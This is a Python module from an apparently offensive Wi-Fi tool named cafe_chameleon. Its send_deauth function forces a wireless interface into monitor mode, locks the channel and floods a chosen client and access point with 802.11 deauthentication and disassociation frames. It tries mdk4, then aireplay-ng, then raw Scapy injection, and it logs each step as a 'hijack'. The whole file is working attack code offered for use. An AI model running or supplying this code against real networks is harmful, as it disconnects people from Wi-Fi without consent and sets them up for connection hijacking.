"""
cafe_chameleon.network.deauth - MDK4 Amok Deauthentication & Disassociation Engine (802.11 Monitor Mode).
"""

import logging
import shutil

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from cafe_chameleon.utils.process import _run
from cafe_chameleon.utils.tracing import trace
from cafe_chameleon.ui.console import log_hijack, set_hijack_status
from cafe_chameleon.scanners.air import get_monitor_interface, set_monitor_mode, set_managed_mode


from cafe_chameleon.network.nmcli import is_open_security, get_bssid_security, get_active_security


def is_monitor_mode_active(iface: str) -> bool:
    """Checks if the given interface or system has an active 802.11 monitor interface."""
    rc, out = _run(f"iw dev {iface} info", debug=False)
    if "type monitor" in out.lower():
        return True
    mon = get_monitor_interface(iface)
    if mon != iface:
        rc, out_mon = _run(f"iw dev {mon} info", debug=False)
        return "type monitor" in out_mon.lower()
    return False


def send_deauth(
    target_mac: str,
    bssid: str | None,
    interface: str = "wlan0",
    count: int = 30,
    channel: int | None = None,
    security: str | None = None,
    force_deauth: bool = False
) -> bool:
    """
    802.11 Deauthentication & Disassociation Engine in Monitor Mode.
    Skips MDK4 deauth on open/unencrypted networks unless force_deauth is enabled.
    Executes MDK4 deauth on WPA2/encrypted networks as normal.
    """
    if not target_mac or target_mac.lower() in ("ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00"):
        return False

    # Check network security: skip MDK4 for open networks unless force_deauth is requested
    if security is not None:
        is_open = is_open_security(security)
    elif bssid and bssid.lower() not in ("ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00"):
        sec = get_bssid_security(bssid)
        is_open = is_open_security(sec) if sec is not None else False
    else:
        sec = get_active_security(interface=interface)
        is_open = is_open_security(sec)

    if is_open and not force_deauth:
        trace(f"[FEATURE] Skipping 802.11 deauth/mdk4 on open network (use --force-deauth to override)")
        log_hijack("[*] Open network detected (no encryption) -> Skipping MDK4 deauth...")
        return True

    set_hijack_status(mac=target_mac, technique="802.11 Deauth Engine", clear_section2=True)
    bssid_target = bssid if bssid else "ff:ff:ff:ff:ff:ff"
    switched_monitor = False
    mon_iface = interface

    try:
        # 1. Ensure 802.11 Monitor Mode
        if not is_monitor_mode_active(interface):
            mon_iface = set_monitor_mode(interface)
            switched_monitor = True
        else:
            mon_iface = get_monitor_interface(interface)

        # 2. Channel Lock
        if channel:
            _run(f"iw dev {mon_iface} set channel {str(channel)}", debug=False)

        log_hijack("[*] Transmitting 802.11 deauthentication frames...")

        success = False

        # Method 1: MDK4 Deauthentication / Disassociation Amok Attack
        if shutil.which("mdk4"):
            try:
                import tempfile
                with tempfile.NamedTemporaryFile("w", delete=False) as tf:
                    tf.write(f"{target_mac}\n")
                    tmp_target_file = tf.name

                cmd = ["mdk4", mon_iface, "d", "-B", bssid_target, "-b", tmp_target_file, "-s", "100"]
                if channel:
                    cmd.extend(["-c", str(channel)])

                _run(cmd, debug=False, timeout=3.0)
                log_hijack("\033[92m[+] Deauth packet burst sent (MDK4)\033[0m")
                success = True
            except Exception as e:
                trace(f"[-] MDK4 error: {e}")

        # Method 2: Aireplay-ng Deauthentication Fallback
        if not success and shutil.which("aireplay-ng"):
            try:
                cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid_target]
                if target_mac.lower() != "ff:ff:ff:ff:ff:ff":
                    cmd.extend(["-c", target_mac])
                cmd.append(mon_iface)
                rc, _ = _run(cmd, debug=False, timeout=4.0)
                if rc == 0:
                    log_hijack("\033[92m[+] Deauth packet burst sent (Aireplay)\033[0m")
                    success = True
            except Exception:
                pass

        # Method 3: Scapy Raw 802.11 Monitor Mode Frame Injection
        if not success:
            try:
                from scapy.all import RadioTap, Dot11, Dot11Deauth, Dot11Disas, sendp
                reason_codes = [1, 2, 6, 7]
                for reason in reason_codes:
                    pkt_deauth = RadioTap() / Dot11(addr1=target_mac, addr2=bssid_target, addr3=bssid_target) / Dot11Deauth(reason=reason)
                    pkt_disas = RadioTap() / Dot11(addr1=target_mac, addr2=bssid_target, addr3=bssid_target) / Dot11Disas(reason=reason)

                    sendp(pkt_deauth, iface=mon_iface, count=10, inter=0.005, verbose=False)
                    sendp(pkt_disas, iface=mon_iface, count=10, inter=0.005, verbose=False)

                log_hijack("\033[92m[+] Deauth frames injected (Scapy)\033[0m")
                success = True
            except Exception as e:
                log_hijack(f"[-] Deauth error: {e}")

        return success
    finally:
        # 3. Restore Managed Mode if temporarily switched or monitor mode is active
        if switched_monitor or is_monitor_mode_active(interface):
            set_managed_mode(interface)
